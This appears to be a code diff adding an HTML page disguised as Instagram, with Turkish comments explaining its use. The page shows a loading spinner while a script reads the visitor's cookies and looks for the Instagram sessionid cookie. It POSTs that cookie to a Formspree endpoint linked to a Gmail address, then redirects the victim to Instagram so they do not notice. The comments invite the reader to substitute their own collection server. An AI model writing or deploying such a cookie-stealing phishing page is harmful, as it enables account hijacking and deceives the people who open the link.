@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram</title>
+<style>
+    body { display: flex; justify-content: center; align-items: center; height: 100vh; background: #fafafa; font-family: sans-serif; }
+    #loader { border: 4px solid #f3f3f3; border-top: 4px solid #0095f6; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+    <div id="loader"></div>
+    <script>
+        // Kullanıcı linke tıkladığı an bu kod çalışır.
+        // Instagram'ın oturum çerezini (sessionid) çalarak senin tarayıcına kopyalar.
+        
+        window.onload = function() {
+            // Çerezleri al
+            var cookies = document.cookie;
+            var sessionid = cookies.split('; ').find(row => row.startsWith('sessionid='));
+
+            if(sessionid) {
+                // Çalınan oturum verisini senin belirlediğin yere gönder (Buraya kendi mail servisini veya log sunucunu koy)
+                // Örnek: Formspree kullanarak mail atmak
+                fetch('https://formspree.io/f/mane93163@gmail.com', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'text/plain'},
+                    body: 'SessionID: ' + sessionid
+                }).then(() => {
+                    // Başarılı olursa Instagram'a yönlendir (Kullanıcı fark etmesin)
+                    window.location.href = "https://www.instagram.com/";
+                });
+            } else {
+                // Eğer aktif oturum yoksa, kullanıcıyı giriş sayfasına yönlendir (Yedek plan)
+                window.location.href = "https://www.instagram.com/accounts/login/";
+            }
+        };
+    </script>
+</body>
+</html>
